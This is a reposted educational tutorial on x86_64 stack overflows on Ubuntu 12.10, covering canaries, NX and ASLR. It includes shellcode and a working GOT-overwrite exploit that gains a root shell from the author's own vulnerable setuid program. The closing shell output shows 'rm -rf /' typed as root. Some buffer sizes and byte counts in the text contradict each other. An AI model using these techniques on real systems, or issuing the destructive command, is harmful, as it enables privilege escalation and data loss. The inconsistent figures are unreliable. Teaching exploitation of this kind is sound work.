title: "Stack Smashing On A Modern Linux System"
date: 2014-01-23 10:14:40
tags:
id: 492
comment: false
categories:
  - 学习笔记
---

Stack Smashing On A Modern Linux System
21 December, 2012 - 06:56 — jip
Prerequisites: 

Basic understanding of C and and x86_64 assembly.

+++++++++++++++++++++++++++++++++++++++++++
+ Stack Smashing On A Modern Linux System +
+            jip@soldierx.com             +
+++++++++++++++++++++++++++++++++++++++++++

[1\. Introduction]
This tutorial will attempt to show the reader the basics of stack overflows and 
explain some of the protection mechanisms present in modern linux distributions.
For this purpose the latest version of Ubuntu (12.10) has been chosen because it 
incorporates several security mechanisms by default, and is overall a popular 
distribution that is easy to install and use. The platform is x86_64.

The reader will learn how stack overflows were originally exploited on older
systems that did not have these mechanisms in place by default. The individual
protections in the latest version of Ubuntu at the time of writing (12.10) will
be explained, and a case will be presented in which these are not sufficient to
prevent the overflowing of a data structure on the stack that will result in 
control of the execution path of the program.

Although the method of exploitation presented does not resemble the classical
method of overflowing (or "smashing") the stack and is in fact closer to the
method used for heap overflows or format string bugs (exploiting an arbitrary
write), the overflow does happen on the stack in spite of Stack Smashing
Protection being used to prevent stack overflows from happening. Now if this 
does not make sense to you yet, don't worry. I will go into more detail below.

[2\. System details]
An overview of the default security mechanisms deployed in different versions of
Ubuntu can be found here: https://wiki.ubuntu.com/Security/Features

-----------------------------------
$ uname -srp && cat /etc/lsb-release | grep DESC && gcc --version | grep gcc
Linux 3.5.0-19-generic x86_64
DISTRIB_DESCRIPTION="Ubuntu 12.10"
gcc (Ubuntu/Linaro 4.7.2-2ubuntu1) 4.7.2
-----------------------------------

[3\. The classical stack overflow]
Let's go back in time. Life was easy and stack frames were there to be smashed.
Sloppy use of data copying methods on the stack could easily result in total
control over the program. Not many protection mechanisms had to be taken into
account, as demonstrated below.

-----------------------------------
$ cat oldskool.c
#include <string.h>

void go(char *data) {
    char name[64];

    strcpy(name, data);
}

int main(int argc, char **argv) {
    go(argv[1]);
}
-----------------------------------

Before testing, you should disable ASLR system-wide, you can do this as follows:

-----------------------------------
$ sudo -i
root@laptop:~# echo "0" > /proc/sys/kernel/randomize_va_space 
root@laptop:~# exit
logout
-----------------------------------

In very old systems this protection mechanism didn't exist. So for the purpose 
of this historical example it has been disabled. To disable the other 
protections, you can compile this example as follows:

$ gcc oldskool.c -o oldskool -zexecstack -fno-stack-protector -g

Looking at the rest of the example, we see that there is a buffer of 64 bytes
allocated on the stack, and that the first argument on the command line is
copied into this buffer. The program does not check whether that argument is
longer than 64 bytes, allowing strcpy() to keep copying data past the end of the
buffer into adjacent memory on the stack. This is known as a stack overflow.

Now in order to gain control of execution of the program we are going to use the
fact that before entering a function, any c program pushes the address of the
instruction it is supposed to execute after completing the function onto the 
stack. We call this address the return address, or Saved Instruction Pointer.
In our example the Saved Instruction Pointer (the address of the instruction
that is supposed to be executed after completion of the go() function) is stored
next to our name[64] buffer, because of the way the stack works. So if the user
can overwrite this return address with any address (supplied via the command 
line argument), the program will continue executing at this address. An attacker 
can hijack the flow of execution by copying instructions in their machine code 
form into the buffer and then pointing the return address to those instructions. 
When the program is done executing the function, it will continue executing the 
instructions provided by the attacker. The attacker can now make the program do 
anything for fun and profit.

Enough talk, let me show you. If you don't understand the following commands,
you can find a tutorial on how to use gdb here: http://beej.us/guide/bggdb/

-----------------------------------
$ gdb -q ./oldskool
Reading symbols from /home/me/.hax/vuln/oldskool...done.
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040053d <+0>:	push   %rbp
   0x000000000040053e <+1>:	mov    %rsp,%rbp
   0x0000000000400541 <+4>:	sub    $0x10,%rsp
   0x0000000000400545 <+8>:	mov    %edi,-0x4(%rbp)
   0x0000000000400548 <+11>:	mov    %rsi,-0x10(%rbp)
   0x000000000040054c <+15>:	mov    -0x10(%rbp),%rax
   0x0000000000400550 <+19>:	add    $0x8,%rax
   0x0000000000400554 <+23>:	mov    (%rax),%rax
   0x0000000000400557 <+26>:	mov    %rax,%rdi
   0x000000000040055a <+29>:	callq  0x40051c 
   0x000000000040055f <+34>:	leaveq 
   0x0000000000400560 <+35>:	retq   
End of assembler dump.
(gdb) break *0x40055a
Breakpoint 1 at 0x40055a: file oldskool.c, line 11.
(gdb) run myname
Starting program: /home/me/.hax/vuln/oldskool myname

Breakpoint 1, 0x000000000040055a in main (argc=2, argv=0x7fffffffe1c8)
11	    go(argv[1]);
(gdb) x/i $rip
=> 0x40055a :	callq  0x40051c 
(gdb) i r rsp
rsp            0x7fffffffe0d0	0x7fffffffe0d0
(gdb) si
go (data=0xc2 ) at oldskool.c:4
4	void go(char *data) {
(gdb) i r rsp
rsp            0x7fffffffe0c8	0x7fffffffe0c8
(gdb) x/gx $rsp
0x7fffffffe0c8:	0x000000000040055f
-----------------------------------

We set a breakpoint right before the call to go(), at 0x000000000040055a <+29>.
Then we run the program with the argument "myname", and it stops before calling
go(). We execute one instruction (si) and see that the stack pointer (rsp) now 
points to a location containing the address right after the callq go instruction
at 0x000000000040055f <+34>. This demonstrates exactly what was discussed above.

The following output will demonstrate that when the go() function is done, it 
will execute the "retq" instruction, which will pop this pointer off the stack,
and continue execution at whatever address it points to.

-----------------------------------
(gdb) disas go
Dump of assembler code for function go:
=> 0x000000000040051c <+0>:	push   %rbp
   0x000000000040051d <+1>:	mov    %rsp,%rbp
   0x0000000000400520 <+4>:	sub    $0x50,%rsp
   0x0000000000400524 <+8>:	mov    %rdi,-0x48(%rbp)
   0x0000000000400528 <+12>:	mov    -0x48(%rbp),%rdx
   0x000000000040052c <+16>:	lea    -0x40(%rbp),%rax
   0x0000000000400530 <+20>:	mov    %rdx,%rsi
   0x0000000000400533 <+23>:	mov    %rax,%rdi
   0x0000000000400536 <+26>:	callq  0x4003f0 
   0x000000000040053b <+31>:	leaveq 
   0x000000000040053c <+32>:	retq   
End of assembler dump.
(gdb) break *0x40053c
Breakpoint 2 at 0x40053c: file oldskool.c, line 8.
(gdb) continue
Continuing.

Breakpoint 2, 0x000000000040053c in go (data=0x7fffffffe4b4 "myname")
8	}
(gdb) x/i $rip
=> 0x40053c :	retq   
(gdb) x/gx $rsp
0x7fffffffe0c8:	0x000000000040055f
(gdb) si
main (argc=2, argv=0x7fffffffe1c8) at oldskool.c:12
12	}
(gdb) x/gx $rsp
0x7fffffffe0d0:	0x00007fffffffe1c8
(gdb) x/i $rip
=> 0x40055f :	leaveq 
(gdb) quit

-----------------------------------

We set a breakpoint right before the go() function returns and continue 
execution. The program stops right before executing the "retq" instruction.
We see that the stack pointer (rsp) still points to the address inside of main
that the program is supposed to jump to after finishing the execution of go().
The retq instruction is executed, and we see that the program has indeed popped
the return address off the stack and has jumped to it. Now we are going to 
overwrite this address by supplying more than 32 bytes of data, using perl:

-----------------------------------
$ gdb -q ./oldskool
Reading symbols from /home/me/.hax/vuln/oldskool...done.
(gdb) run `perl -e 'print "A"x48'`
Starting program: /home/me/.hax/vuln/oldskool `perl -e 'print "A"x48'`

Program received signal SIGSEGV, Segmentation fault.
0x000000000040059c in go (data=0x7fffffffe49a 'A' )
12	}
(gdb) x/i $rip
=> 0x40059c :	retq   
(gdb) x/gx $rsp
0x7fffffffe0a8:	0x4141414141414141
-----------------------------------

We use perl to print a string of 80 x "A" on the command line, and pass that as
an argument to our example program. We see that the program crashes when it 
tries to execute the "retq" instruction inside the go() function, since it
tries to jump to the return address which we have overwritten with "A"s (0x41).
Note that we have to write 80 bytes (64 + 8 + 8 ) because pointers are 8 bytes
long on 64 bit machines, and there is actually another stored pointer between
our name buffer and the Saved Instruction Pointer.

Okay, so now we can redirect the execution path to any location we want. How can
we use this to make the program do our bidding? If we place our own machine code
instructions inside the name[] buffer and then overwrite the return address 
with the address of the beginning of this buffer, the program will continue
executing our instructions (or "shellcode") after it's done executing the go 
function. So we need to create a shellcode, and we need to know the address of
the name[] buffer so we know what to overwrite the return address with. I will
not go into creating shellcode as this is a little bit outside the scope of this
tutorial, but will instead provide you with a shellcode that prints a message to
the screen. We can determine the address of the name[] buffer like this:

-----------------------------------
(gdb) p &name
$2 = (char (*)[32]) 0x7fffffffe0a0
-----------------------------------

We can use perl to print unprintable characters to the command line, by escaping
them like this: "\x41". Furthermore, because of the way little-endian machines
store integers and pointers, we have to reverse the order of the bytes. So the 
value we will use to overwrite the Saved Instruction Pointer will be:
"\xa0\xe0\xff\xff\xff\x7f"

This is the shellcode that will print our message to the screen and then exit:
"\xeb\x22\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\xff\xc0\x48\xff\xc7\x5e\x48
\x83\xc2\x04\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xd9
\xff\xff\xff\x48\x61\x78\x21"

Note that these are just instructions in machine code form, escaped so that they
are printable with perl. Because the shellcode is 45 bytes long, and we need to
provide 72 bytes of data before we can overwrite the SIP, we have to add 27
bytes as padding. So the string we use to own the program looks like this:

"\xeb\x22\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\xff\xc0\x48\xff\xc7\x5e\x48
\x83\xc2\x04\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xd9
\xff\xff\xff\x48\x61\x78\x21" . "A"x27 . "\xa0\xe0\xff\xff\xff\x7f"

The program will jump to 0x7fffffffe0a0 when it is done executing the function 
go(). This is where the name[] buffer is located, which we have filled with our
machine code. It should then execute our machine code to print our message and 
exit the program. Let's try it (note that you should remove all line breaks when 
you try to reproduce this):

-----------------------------------
$ ./oldskool `perl -e 'print "\xeb\x22\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48
\xff\xc0\x48\xff\xc7\x5e\x48\x83\xc2\x04\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c
\x48\x31\xff\x0f\x05\xe8\xd9\xff\xff\xff\x48\x61\x78\x21" . "A"x27 . "\xa0\xe0
\xff\xff\xff\x7f"'`
Hax!$ 
-----------------------------------

It worked! Our important message has been delivered, and the process has exit.

[4\. Protection mechanisms]
Welcome back to 2012\. The example above does not work anymore on so many levels.
There are a lot of different protection mechanisms in place today on our ubuntu
system, and this particular type of vulnerability does not even exist in this
form anymore. There are still overflows that can happen on the stack though,
and there are still ways of exploiting them. That is what I want to show you
in this section, but first let's look at the different protection schemes.

[4.1 Stack Smashing Protection]
In the first example, we used the -fno-stack-protector flag to indicate to gcc
that we did not want to compile with stack smashing protection. What happens if
we leave this out, along with the other flags we passed earlier? Note that at 
this point ASLR is back on and so everything is set to their defaults.

$ gcc oldskool.c -o oldskool -g

Let's look at the binary with gdb for a minute and see what's going on.

-----------------------------------
$ gdb -q ./oldskool
Reading symbols from /home/me/.hax/vuln/oldskool...done.
(gdb) disas go
Dump of assembler code for function go:
   0x000000000040058c <+0>:	push   %rbp
   0x000000000040058d <+1>:	mov    %rsp,%rbp
   0x0000000000400590 <+4>:	sub    $0x60,%rsp
   0x0000000000400594 <+8>:	mov    %rdi,-0x58(%rbp)
   0x0000000000400598 <+12>:	mov    %fs:0x28,%rax
   0x00000000004005a1 <+21>:	mov    %rax,-0x8(%rbp)
   0x00000000004005a5 <+25>:	xor    %eax,%eax
   0x00000000004005a7 <+27>:	mov    -0x58(%rbp),%rdx
   0x00000000004005ab <+31>:	lea    -0x50(%rbp),%rax
   0x00000000004005af <+35>:	mov    %rdx,%rsi
   0x00000000004005b2 <+38>:	mov    %rax,%rdi
   0x00000000004005b5 <+41>:	callq  0x400450 
   0x00000000004005ba <+46>:	mov    -0x8(%rbp),%rax
   0x00000000004005be <+50>:	xor    %fs:0x28,%rax
   0x00000000004005c7 <+59>:	je     0x4005ce 
   0x00000000004005c9 <+61>:	callq  0x400460 <__stack_chk_fail@plt>
   0x00000000004005ce <+66>:	leaveq 
   0x00000000004005cf <+67>:	retq   
End of assembler dump.
-----------------------------------

If we look at go+12 and go+21, we see that a value is taken from $fs+0x28, or
%fs:0x28\. What exactly this address points to is not very important, for now
I will just say fs points to structures maintained by the kernel, and we can't
actually inspect the value of fs using gdb. What is more important to us is that
this location contains a random value that we cannot predict, as demonstrated:

-----------------------------------
(gdb) break *0x0000000000400598
Breakpoint 1 at 0x400598: file oldskool.c, line 4.
(gdb) run
Starting program: /home/me/.hax/vuln/oldskool 

Breakpoint 1, go (data=0x0) at oldskool.c:4
4	void go(char *data) {
(gdb) x/i $rip
=> 0x400598 :	mov    %fs:0x28,%rax
(gdb) si
0x00000000004005a1	4	void go(char *data) {
(gdb) i r rax
rax            0x110279462f20d000	1225675390943547392
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/me/.hax/vuln/oldskool 

Breakpoint 1, go (data=0x0) at oldskool.c:4
4	void go(char *data) {
(gdb) si
0x00000000004005a1	4	void go(char *data) {
(gdb) i r rax
rax            0x21f95d1abb2a0800	2448090241843202048
-----------------------------------

We break right before the instruction that moves the value from $fs+0x28 into
rax and execute it, inspect rax and repeat the whole process and see clearly 
that the value changed between runs. So this is a value that is different every 
time the program runs, which means that an attacker can't reliably predict it.
So how is this value used to protect the stack? If we look at go+21 we see that
the value is copied onto the stack, at location -0x8(%rbp). If we look at the 
prologue to deduct what that points at, we see that this random value is right
in between the function's local variables and the saved instruction pointer.
This is called a "canary" value, referring to the canaries miners use to alert
them whenever a gas leak is going on, since the canaries would die way before
any human is in danger. Much like that situation, when a stack overflow occurs, 
the canary value would be the first to die, before the saved instruction pointer
could be overwritten. If we look at go+46 and go+50, we see that the value is
read from the stack and compared to the original value. If they are equal, the
canary has not been changed and thus the saved instruction pointer hasn't been
altered either, allowing the function to return safely. If the value has been
changed, a stack overflow has occured and the saved instruction pointer may have
been compromised. Since it's not safe to return, the function instead calls the
__stack_chk_fail function. This function does some magic, throws an error and
eventually exits the process. This is what that looks like:

-----------------------------------
$ ./oldskool `perl -e 'print "A"x80'`
*** stack smashing detected ***: ./oldskool terminated
Aborted (core dumped)
-----------------------------------

So to recap, the buffer is overflowed, and data is copied over the canary value
and over the saved instruction pointer. However, before attempting to return 
to this overwritten SIP, the program detects that the canary has been tampered 
with and exits safely before doing the attackers bidding. Now the bad news is
that there is not really a good way around this situation for the attacker.
You might think about bruteforcing the stack canary, but in this case it would
be different for every run, so you would have to be extremely lucky to hit the
right value. It would take some time and would not be very stealthy either.
The good news is that there are plenty of situations in which this is not 
sufficient to prevent exploitation. For example, stack canaries are only used 
to protect the SIP and not to protect application variables. This could lead to 
other exploitable situations, as shown later. The oldskool method of "smashing" 
the stack frame to trick the program into returning to our code is effectively 
killed by this protection mechanism though; it is no longer viable.

[4.2 NX: non-executable memory]
Now you might have noticed we did not just skip the -fno-stack-protector flag 
this time, but we also left out the -zexecstack flag. This flag told the system 
to allow us to execute instructions stored on the stack. Modern systems do not
allow for this to happen, by either marking memory as writable for data, or 
executable for instructions. No region of memory will be both writable and
executable at the same time. If you think about this, this means that the we
have no way of storing shellcode in memory that the program could later execute.
Since we cannot write to the executable sections of memory and the program
can't execute instructions located in the writable sections of memory, we will
need some other way to trick the program into doing what we want. The answer is
ROP, or Return-Oriented Programming. The trick here is to use parts of code that
are already in the program itself, thus located in the executable .text section
of the binary, and chain them together in a way so that they will resemble our 
old shellcode. I will not go too deeply into this subject, but I will show you 
an example at the end of this tutorial. Let me finish by demonstrating that a
program will fail when trying to execute instructions from the stack:

-----------------------------------
$ cat nx.c
int main(int argc, char **argv) {
    char shellcode[] = 
        "\xeb\x22\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\xff\xc0\x48\xff"
        "\xc7\x5e\x48\x83\xc2\x04\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48"
        "\x31\xff\x0f\x05\xe8\xd9\xff\xff\xff\x48\x61\x78\x21";

    void (*func)() = (void *)shellcode;
    func();
}
$ gcc nx.c -o nx -zexecstack
$ ./nx
Hax!$ 
$ gcc nx.c -o nx
$ ./nx
Segmentation fault (core dumped)
-----------------------------------

We placed our shellcode from earlier in a buffer on the stack, and set a 
function pointer to point to that buffer before calling it. When we compile with
the -zexecstack like before, the code can be executed on the stack. But without 
the flag, the stack is marked as non executable by default, and the program will 
fail with a segmentation fault.

[4.3 ASLR: Address Space Layout Randomization]
The last thing we disabled when trying out the classic stack overflow example 
was ASLR, by executing echo "0" > /proc/sys/kernel/randomize_va_space as root.
ASLR makes sure that every time the program is loaded, it's libraries and memory
regions are mapped at random locations in virtual memory. This means that when 
running the program twice, buffers on the stack will have different addresses
between runs. This means that we cannot simply use a static address pointing to
the stack that we happened to find by using gdb, because these addresses will 
not be correct the next time the program is run. Note that gdb will disable ASLR
when debugging a program, and we can enable it inside gdb for a more realistic
view of what's going on as shown below (output is trimmed on the right, the 
addresses are what's important here):

-----------------------------------
$ gdb -q ./oldskool
Reading symbols from /home/me/.hax/vuln/oldskool...done.
(gdb) set disable-randomization off
(gdb) break main
Breakpoint 1 at 0x4005df: file oldskool.c, line 11.
(gdb) run
Starting program: /home/me/.hax/vuln/oldskool 

Breakpoint 1, main (argc=1, argv=0x7fffe22fe188) at oldskool.c:11
11	    go(argv[1]);
(gdb) i proc map
process 6988
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /home/me/.hax/vuln
            0x600000           0x601000     0x1000        0x0 /home/me/.hax/vuln
            0x601000           0x602000     0x1000     0x1000 /home/me/.hax/vuln
      0x7f0e120ef000     0x7f0e122a4000   0x1b5000        0x0 /lib/x86_64-linux-
      0x7f0e122a4000     0x7f0e124a3000   0x1ff000   0x1b5000 /lib/x86_64-linux-
      0x7f0e124a3000     0x7f0e124a7000     0x4000   0x1b4000 /lib/x86_64-linux-
      0x7f0e124a7000     0x7f0e124a9000     0x2000   0x1b8000 /lib/x86_64-linux-
      0x7f0e124a9000     0x7f0e124ae000     0x5000        0x0 
      0x7f0e124ae000     0x7f0e124d0000    0x22000        0x0 /lib/x86_64-linux-
      0x7f0e126ae000     0x7f0e126b1000     0x3000        0x0 
      0x7f0e126ce000     0x7f0e126d0000     0x2000        0x0 
      0x7f0e126d0000     0x7f0e126d1000     0x1000    0x22000 /lib/x86_64-linux-
      0x7f0e126d1000     0x7f0e126d3000     0x2000    0x23000 /lib/x86_64-linux-
      0x7fffe22df000     0x7fffe2300000    0x21000        0x0 [stack]
      0x7fffe23c2000     0x7fffe23c3000     0x1000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/me/.hax/vuln/oldskool 

Breakpoint 1, main (argc=1, argv=0x7fff7e16cfd8) at oldskool.c:11
11	    go(argv[1]);
(gdb) i proc map
process 6991
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /home/me/.hax/vuln
            0x600000           0x601000     0x1000        0x0 /home/me/.hax/vuln
            0x601000           0x602000     0x1000     0x1000 /home/me/.hax/vuln
      0x7fdbb2753000     0x7fdbb2908000   0x1b5000        0x0 /lib/x86_64-linux-
      0x7fdbb2908000     0x7fdbb2b07000   0x1ff000   0x1b5000 /lib/x86_64-linux-
      0x7fdbb2b07000     0x7fdbb2b0b000     0x4000   0x1b4000 /lib/x86_64-linux-
      0x7fdbb2b0b000     0x7fdbb2b0d000     0x2000   0x1b8000 /lib/x86_64-linux-
      0x7fdbb2b0d000     0x7fdbb2b12000     0x5000        0x0 
      0x7fdbb2b12000     0x7fdbb2b34000    0x22000        0x0 /lib/x86_64-linux-
      0x7fdbb2d12000     0x7fdbb2d15000     0x3000        0x0 
      0x7fdbb2d32000     0x7fdbb2d34000     0x2000        0x0 
      0x7fdbb2d34000     0x7fdbb2d35000     0x1000    0x22000 /lib/x86_64-linux-
      0x7fdbb2d35000     0x7fdbb2d37000     0x2000    0x23000 /lib/x86_64-linux-
      0x7fff7e14d000     0x7fff7e16e000    0x21000        0x0 [stack]
      0x7fff7e1bd000     0x7fff7e1be000     0x1000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
-----------------------------------

We set "disable-randomization" to "off", we run the program twice and inspect
the mappings to see that most of them have different addresses. Indeed, not all
of them do, and this is the key to succesful exploitation with ASLR enabled.

[5\. Modern stack overflow]
So, even with all these protection mechanisms in place, sometimes there is room
for an overflow. And sometimes that overflow leads to successful exploitation.
I showed you how the stack canary protects the stack frame from being messed up
and the SIP from being overwritten by copying past the end of a local buffer.
But the stack canaries are only placed before the SIP, not between variables
located on the stack. So it is still possible for a variable on the stack to be
overwritten in the same fashion as the SIP was overwritten in our first example.
This can lead to a lot of different problems, in some cases we can simply 
overwrite a function pointer that is called at some point. In some other cases
we can overwrite a pointer that is later used to write or read data, and thus
control this read or write. This is what I am going to show you. By overflowing
a buffer on the stack and overwriting a pointer on the stack that is later used
to write user-supplied data, the attacker can write data to an arbitrary 
location. A situation like this can often be exploited to gain control of 
execution. Here is the source code of the example vulnerability:

-----------------------------------
$ cat stackvuln.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define MAX_SIZE 48
#define BUF_SIZE 64

char data1[BUF_SIZE], data2[BUF_SIZE];

struct item {
    char data[MAX_SIZE];
    void *next;
};

int go(void) {
    struct item item1, item2;

    item1.next = &item2;
    item2.next = &item1;

    memcpy(item1.data, data1, BUF_SIZE); // Whoops, did we mean MAX_SIZE?
    memcpy(item1.next, data2, MAX_SIZE); // Yes, yes we did.

    exit(-1);                            // Exit in shame.
}

void hax(void) {
    execl("/bin/bash", "/bin/bash", "-p", NULL);
}

void readfile(char *filename, char *buffer, int len) {
    FILE *fp;

    fp = fopen(filename, "r");
    if (fp != NULL) {
        fread(buffer, 1, len, fp);
        fclose(fp);
    }
}

int main(int argc, char **argv) {
    readfile("data1.dat", data1, BUF_SIZE);
    readfile("data2.dat", data2, BUF_SIZE);

    go();
}

$ gcc stackvuln.c -o stackvuln
$ sudo chown root:root stackvuln
$ sudo chmod +s ./stackvuln
-----------------------------------

For the purpose of this example, I have included the "hax()" function which is 
obviously where we want to redirect execution to. Originally I wanted to include
an example using a ROP chain to call a function like system(), but I decided not
to for two reasons: it is perhaps a little bit out of scope for this tutorial 
and I think it would make this tutorial too hard to follow for beginners, 
besides that it was quite hard to find good gadgets in a program this small.
The use of this function does illustrate the point that because of NX, we can't
push our own shellcode onto the stack and execute it, but we have to reuse code
that is in the program already (be it a function, or a chain of ROP gadgets).
Google ROP exploitation if you are interested in the real deal.

Our overflow happens in the go() function. It creates a circular list with two
items of the 'struct item' type. The first memcpy accidentally copies too many
bytes into the structure, allowing us to overwrite the "next" pointer which is 
used to write to in the second call. So, if we can overwrite the next pointer
with an address of our choice, we can control where memcpy writes to. Besides,
we also control data1 and data2, because these buffers are read from a file.
This data could've come from a network connection or some other input, but I
chose to use files because it allows us to easily alter the payloads for 
demonstration purposes. So, we can write any 48 bytes we want, to any location 
we want. How can we use this to gain control of the program?

We are going to use a structure called the GOT/PLT. I will try to explain 
quickly what it is, but if you need more information there is a lot of it on the
web. The .got.plt is a table of addresses that a binary uses to keep track of 
the location of functions that are in a library. As I explained before, ASLR
makes sure that a library is mapped to a different virtual memory address every
time the program runs. So the program can't use static absolute addresses to 
refer to functions inside these libraries, because these addresses would change
every run. So, the short version is, it uses a mechanism that calls a stub to
calculate the real address of the function, store it in a table, and use that
for future reference. So every time the function is called, the address inside
this table (.got.plt) is used.

We can abuse this by overwriting this address, so that the next time the program
thinks it's calling the function that corresponds with that particular entry,
it will be redirected to an instruction of our choice, much like the redirection
we used before by overwriting the return pointer. If we look at our example, we
see that exit() is called right after the calls to memcpy(). So, if we can use
the arbitrary write provided by those calls to overwrite the .got.plt entry of
exit(), the program will jump to the address we provided instead of the address
of exit() inside libc. Which address will we use? You guessed it, the address
of hax(). First, let me show you how the .got.plt is used when exit() is called:

-----------------------------------
$ cat exit.c
#include <stdlib.h>

int main(int argc, char **argv) {
    exit(0);
}
$ gcc exit.c -o exit -g
$ gdb -q ./exit
Reading symbols from /home/me/.hax/plt/exit...done.
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040051c <+0>:	push   %rbp
   0x000000000040051d <+1>:	mov    %rsp,%rbp
   0x0000000000400520 <+4>:	sub    $0x10,%rsp
   0x0000000000400524 <+8>:	mov    %edi,-0x4(%rbp)
   0x0000000000400527 <+11>:	mov    %rsi,-0x10(%rbp)
   0x000000000040052b <+15>:	mov    $0x0,%edi
   0x0000000000400530 <+20>:	callq  0x400400 
End of assembler dump.
(gdb) x/i 0x400400
   0x400400 :	jmpq   *0x200c1a(%rip)        # 0x601020 
(gdb) x/gx 0x601020
0x601020 :	0x0000000000400406
-----------------------------------

We see at main+20 that instead of calling exit inside libc directly, 0x400400 is
called, which is a stub inside the plt. It jumps to whatever address is located
at 0x601020, inside the got.plt. Now in this case this is an address back 
inside the stub again, which resolves the address of the function inside libc, 
and replaces the entry in 0x601020 with the real address of exit. So whenever
exit is called, the address 0x601020 is used regardless of whether the real
address has been resolved yet or not. So, we need to overwrite this location 
with the address of the hax() function, and the program will execute that 
function instead of exit(). So for our example vulnerability, we need to locate
where the entry to exit is inside the .got.plt, overwrite the pointer in the 
structure with this address, and then fill the data2 buffer with the pointer to
the hax() function. The first call will then overwrite the item1.next pointer
with the pointer to the exit entry inside got.plt, the second call will 
overwrite this location with the pointer to hax(). After that, exit() is called
so our pointer is used and hax() will execute, spawning a root shell. Let's go!
Oh, one more thing: because the entry of execl() is located right after the
entry of exit() and our memcpy call will copy 48 bytes, we need to make sure 
that this pointer is not wrecked by including it in our payload. 

-----------------------------------
(gdb) mai i sect .got.plt
Exec file:
    `/tmp/stackvuln/stackvuln', file type elf64-x86-64.
    0x00601000->0x00601050 at 0x00001000: .got.plt ALLOC LOAD DATA HAS_CONTENTS
(gdb) x/10gx 0x601000
0x601000:	0x0000000000600e28	0x0000000000000000
0x601010:	0x0000000000000000	0x0000000000400526
0x601020 < fclose@got.plt>:	0x0000000000400536	0x0000000000400546
0x601030 < memcpy@got.plt>:	0x0000000000400556	0x0000000000400566
0x601040 < exit@got.plt>:	0x0000000000400576	0x0000000000400586
(gdb) p hax
$1 = {< text variable, no debug info >} 0x40073b 
-----------------------------------

Okay, so the entry of exit is at 0x601040, and hax() is at 0x40073b. Let's
construct our payloads:

-----------------------------------
$ hexdump data1.dat -vC
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000020  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000030  40 10 60 00 00 00 00 00                           |@.`.....|
00000038
$ hexdump data2.dat -vC
00000000  3b 07 40 00 00 00 00 00  86 05 40 00 00 00 00 00  |;.@.......@.....|
00000010
-----------------------------------

For the first call, we use 48 bytes of padding, and then overwrite the "next"
pointer with a pointer to the .got.plt entry. Remember that because we are on
a little-endian architecture, the order of the individual bytes of the address
is reversed. The second file contains the pointer to the function of hax(), which
will be written to the .got.plt in the exit() entry. The second address is the
entry of execl(), and contains it's original address just to make sure it is 
still callable. After the two calls to memcpy, exit@plt will be called and will
use our address to hax() from the .got.plt. This will mean hax() gets executed.

-----------------------------------
$ ./stackvuln
bash-4.2# whoami
root
bash-4.2# rm -rf /
© Offensive Security 2011